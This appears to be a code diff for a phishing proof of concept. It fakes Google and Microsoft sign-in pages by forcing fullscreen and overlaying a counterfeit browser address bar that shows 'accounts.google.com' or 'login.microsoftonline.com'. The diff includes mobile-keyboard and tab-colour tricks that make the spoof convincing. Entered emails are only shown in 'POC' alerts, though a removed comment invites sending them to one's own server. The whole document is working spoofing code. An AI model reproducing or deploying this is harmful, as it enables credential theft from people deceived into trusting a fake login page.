+const googleNextBtn = document.getElementById('googleNextBtn');
+const msNextBtn = document.getElementById('msNextBtn');
 
-function goFullscreen() {
-  const elem = document.documentElement;
-  if (elem.requestFullscreen) elem.requestFullscreen();
-  else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
-  else if (elem.mozRequestFullScreen) elem.mozRequestFullScreen();
-  else if (elem.msRequestFullscreen) elem.msRequestFullscreen();
+let isFullscreen = false;
+let selectedProvider = '';
+
+// Show login modal
+function showLoginModal() {
+  loginModal.classList.add('active');
 }
 
-// Tampilkan loading + fullscreen
-function startAttack(showGoogle = true) {
-  loading.classList.add('active');
-  goFullscreen();
+// Close login modal
+function closeLoginModal() {
+  loginModal.classList.remove('active');
+}
 
+// Select login provider
+function selectLoginProvider(provider) {
+  selectedProvider = provider;
+  closeLoginModal();
+  
+  // Show loading
+  loadingOverlay.classList.add('active');
+  
+  // Enter fullscreen
+  enterFullscreen();
+  
+  // Switch to appropriate login page
   setTimeout(() => {
-    loading.classList.remove('active');
-    blogPage.style.display = 'none';
-    modal.style.display = 'none';
-
-    if (showGoogle) {
-      googlePage.classList.add('active');
-      fakeUrl.textContent = 'https://accounts.google.com/signin/v2/identifier';
-    } else {
-      loginPage.classList.add('active');
-      fakeUrl.textContent = 'https://login.microsoftonline.com';
+    loadingOverlay.classList.remove('active');
+    blogPage.classList.add('hidden');
+    
+    if (provider === 'google') {
+      googleLoginPage.classList.add('active');
+      topFakeUrl.textContent = 'accounts.google.com';
+      bottomFakeUrl.textContent = 'accounts.google.com';
+      changeTabColor('#ffffff');
+      setTimeout(() => googleEmail.focus(), 300);
+    } else if (provider === 'microsoft') {
+      msLoginPage.classList.add('active');
+      topFakeUrl.textContent = 'login.microsoftonline.com';
+      bottomFakeUrl.textContent = 'login.microsoftonline.com';
+      changeTabColor('#ffffff');
+      setTimeout(() => msEmail.focus(), 300);
     }
-
-    fakeTopBar.classList.add('active');
-  }, 1000);
+  }, 800);
 }
 
-// Event
-continueBtn.onclick = () => modal.classList.add('active');
+// Fullscreen functions
+function enterFullscreen() {
+  const elem = document.documentElement;
+  if (elem.requestFullscreen) {
+    elem.requestFullscreen();
+  } else if (elem.webkitRequestFullscreen) {
+    elem.webkitRequestFullscreen();
+  } else if (elem.mozRequestFullScreen) {
+    elem.mozRequestFullScreen();
+  } else if (elem.msRequestFullscreen) {
+    elem.msRequestFullscreen();
+  }
+}
 
-loginGoogle.onclick = () => startAttack(true);   // Google login
-loginMicrosoft.onclick = () => startAttack(false); // Microsoft login
+function exitFullscreen() {
+  if (document.exitFullscreen) {
+    document.exitFullscreen();
+  } else if (document.webkitExitFullscreen) {
+    document.webkitExitFullscreen();
+  } else if (document.mozCancelFullScreen) {
+    document.mozCancelFullScreen();
+  } else if (document.msExitFullscreen) {
+    document.msExitFullscreen();
+  }
+}
 
-// Demo capture (ganti dengan kirim ke servermu kalau mau)
-document.getElementById('googleNext').onclick = () => {
-  const email = document.getElementById('googleEmail').value;
-  if (email) alert('[POC] Google Email captured: ' + email);
-};
-document.getElementById('nextBtn').onclick = () => {
-  const email = document.getElementById('email').value;
-  if (email) alert('[POC] Microsoft Email captured: ' + email);
-};
+// Detect fullscreen changes
+document.addEventListener('fullscreenchange', handleFullscreenChange);
+document.addEventListener('webkitfullscreenchange', handleFullscreenChange);
+document.addEventListener('mozfullscreenchange', handleFullscreenChange);
+document.addEventListener('MSFullscreenChange', handleFullscreenChange);
 
-// Biar fake bar tetap di atas saat keyboard muncul
-window.visualViewport?.addEventListener('resize', () => {
-  if (document.fullscreenElement) {
-    fakeTopBar.style.top = `${window.visualViewport.offsetTop}px`;
+function handleFullscreenChange() {
+  isFullscreen = !!(document.fullscreenElement || 
+                    document.webkitFullscreenElement || 
+                    document.mozFullScreenElement ||
+                    document.msFullscreenElement);
+  
+  if (isFullscreen) {
+    document.body.classList.add('fullscreen-active');
+    setTimeout(() => {
+      fakeTopBar.style.opacity = '1';
+      fakeTopBar.style.visibility = 'visible';
+    }, 100);
+  } else {
+    document.body.classList.remove('fullscreen-active');
+    fakeTopBar.style.opacity = '0';
+    fakeTopBar.style.visibility = 'hidden';
+  }
+}
+
+function changeTabColor(color) {
+  if (metaTheme) metaTheme.setAttribute('content', color);
+}
+
+function showFakeBar() {
+  fakeBar.classList.add('show');
+}
+
+function hideFakeBar() {
+  fakeBar.classList.remove('show');
+  fakeBar.style.bottom = '0px';
+}
+
+function adjustFakeBar() {
+  const vv = window.visualViewport;
+  if (vv) {
+    fakeBar.style.bottom = `${window.innerHeight - vv.height}px`;
+  } else {
+    fakeBar.style.bottom = '0px';
+  }
+}
+
+// Google email input handlers
+googleEmail.addEventListener('focus', () => {
+  setTimeout(() => changeTabColor('#1c1c1e'), 100);
+  setTimeout(() => {
+    showFakeBar();
+    adjustFakeBar();
+  }, 200);
+});
+
+googleEmail.addEventListener('blur', () => {
+  setTimeout(() => {
+    hideFakeBar();
+    changeTabColor('#ffffff');
+  }, 100);
+});
+
+// Microsoft email input handlers
+msEmail.addEventListener('focus', () => {
+  setTimeout(() => changeTabColor('#1c1c1e'), 100);
+  setTimeout(() => {
+    showFakeBar();
+    adjustFakeBar();
+  }, 200);
+});
+
+msEmail.addEventListener('blur', () => {
+  setTimeout(() => {
+    hideFakeBar();
+    changeTabColor('#ffffff');
+  }, 100);
+});
+
+// Handle next buttons
+googleNextBtn.addEventListener('click', (e) => {
+  e.preventDefault();
+  const email = googleEmail.value;
+  if (email) {
+    alert('Demo POC - Google Email captured: ' + email);
+  }
+});
+
+msNextBtn.addEventListener('click', (e) => {
+  e.preventDefault();
+  const email = msEmail.value;
+  if (email) {
+    alert('Demo POC - Microsoft Email captured: ' + email);
+  }
+});
+
+if (window.visualViewport) {
+  window.visualViewport.addEventListener('resize', adjustFakeBar);
+}
+window.addEventListener('orientationchange', adjustFakeBar);
+
+// Close modal when clicking outside
+loginModal.addEventListener('click', (e) => {
+  if (e.target === loginModal) {
+    closeLoginModal();
   }
 });
 </script>
